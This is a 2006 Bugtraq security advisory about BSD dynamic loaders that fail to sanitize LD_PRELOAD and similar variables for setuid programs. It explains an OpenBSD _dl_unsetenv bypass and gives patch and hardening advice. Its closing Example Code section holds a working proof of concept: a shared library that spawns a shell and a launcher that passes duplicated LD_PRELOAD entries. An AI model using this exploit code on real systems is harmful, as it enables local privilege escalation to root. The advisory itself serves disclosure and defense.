@@ -1,0 +1,154 @@
+
+Date: Wed, 22 Nov 2006 16:02:53 -0500
+From: "In Cognito" <defend.the.world@...il.com>
+To: bugtraq@...urityfocus.com
+Subject: Lack of environment sanitization in the FreeBSD, OpenBSD, NetBSD dynamic loaders.
+
+Impact:  Serious. May lead to privilege escalation.
+
+A class of security vulnerabilities has resurfaced in the dynamic loaders
+of FreeBSD, OpenBSD, and NetBSD in the sanitization of environment
+variables for suid and sgid binaries.
+
+Due to either badly implemented sanitization or a lack of it, a setuid
+binary may execute other processes with a tainted environment.
+
+OpenBSD:
+
+The OpenBSD dynamic loader clears out environment variables but,
+ due to a logic problem,_dl_unsetenv() could be fooled with two
+adjacent entries. This was discovered by Mark
+Dowd and John McDonald and published on a blog announcing their new book:
+"Art of Software Security Assessment, The: Identifying and Avoiding
+Software Vulnerabilities"
+
+The link to the blog post:
+http://www.matasano.com/log/592/finger-79tcp-mcdonald-dowd-and-schuh-challenge-part-2/
+
+For a look at the code in question the above link should work
+ as well as a glance at the OpenBSD src tree for /src/libexec/ld.so/loader.c.
+
+This does not allow direct code execution as the variable is also cleared (*).
+
+/src/libexec/ld.so/loader.c:
+--------------
+       if (_dl_issetugid()) {  /* Zap paths if s[ug]id... */
+       ...
+               if (_dl_preload) {
+                       _dl_preload = NULL; (*)
+                       _dl_unsetenv("LD_PRELOAD", envp);
+               }
+---------------
+However, the argument will be present in the environment of the privileged
+process. If the privileged process sets its real uid equal to its effective uid
+ before executing another program then it may lead to privilege escalation as
+the issetugid() check will return 0. A shared library of the attacker's choice
+can then be loaded. Example code is provided at the end.
+
+This is not common procedure for privileged executables but does occur.
+OpenBSD's default ch*/chpass/passwd utils are one such example.
+
+src/usr.bin/passwd/local_passwd.c:
+---------------
+       /* Drop user's real uid and block all signals to avoid a DoS. */
+       setuid(0);
+       sigfillset(&fullset);
+       sigdelset(&fullset, SIGINT);
+       sigprocmask(SIG_BLOCK, &fullset, NULL);
+   ...
+       if (pw_mkdb(uname, pwflags) < 0)
+               pw_error(NULL, 0, 1);
+   ...
+----------------
+
+src/lib/libutil/passwd.c
+-----------------------
+int
+pw_mkdb(char *username, int flags)
+ ....
+ execv(_PATH_PWD_MKDB, av);
+-----------------------
+
+The said pw_mkdb() function executes /usr/sbin/pwd_mkdb without sanitizing the
+environment. Since the /usr/bin/passwd binary runs root-user suid this may lead
+to a local root compromise.
+
+Fortunately though, on all OpenBSD systems tested /usr/sbin/pwd_mkdb
+was statically
+linked rendering this attack futile.
+
+See http://www.openbsd.org/errata.html#ldso for patch information.
+
+
+
+FreeBSD/NetBSD:
+
+Unlike OpenBSD, no attempt is made to clear dangerous variables. The
+FreeBSD/NetBSD dynamic loaders simply do not process the variables
+when ruid does not equal euid. This is exploitable for the reasons
+described above.
+
+After brief research no critical default-install binaries appeared vulnerable
+ to this type of attack either. On FreeBSD/Netbsd setuid(0) is not
+used on the default password utils. There are plenty of non-default
+packages out there that are suceptible to this attack though...
+
+Conclusion
+ It is arguable where the responsibility lies for sanitizing
+environment variables.
+ A more defensive loader is the best counter-measure to protect
+against this attack. This was potentially a very nasty bug on OpenBSD
+where setuid(0)s occured. This is still a bug on NetBSD/FreeBSD and
+needs to be fixed.
+
+Linux is not affected by this attack.
+
+Fix:
+ Remove dangerous environment variables from the environment of suid processes.
+
+ Hardening of the pw_mkdb() function can't hurt either.
+
+Credits
+--------
+Mark Dowd, John McDonald, and Justin Schuh and their new book. Thanks
+for publishing the OpenBSD loader bug.
+
+shm -  FreeBSD/NetBSD research.
+
+
+Example Code
+-------------
+vulnerable root-suid program example:
+
+main()
+{
+ setuid(0);
+ execl("/usr/bin/id","id",0);
+}
+
+
+
+evil shared library:
+
+__attribute__ ((constructor)) main()
+{
+ printf("[+] Hello from shared library land\n");
+ execle("/bin/sh","sh",0,0);
+}
+
+
+
+openbsd _dl_unsetenv bypass:
+
+#define LIB "LD_PRELOAD=/tmp/lib.so"
+main(int argc, char *argv[])
+{
+ char *e[] = { LIB, LIB, 0 };
+ int i; for(i = 0; argv[i]; argv[i] = argv[++i]); /* inspired by
+_dl_unsetenv (: */
+ execve(argv[0], argv, e);
+}
+
+
+
+Have fun! Stay safe!
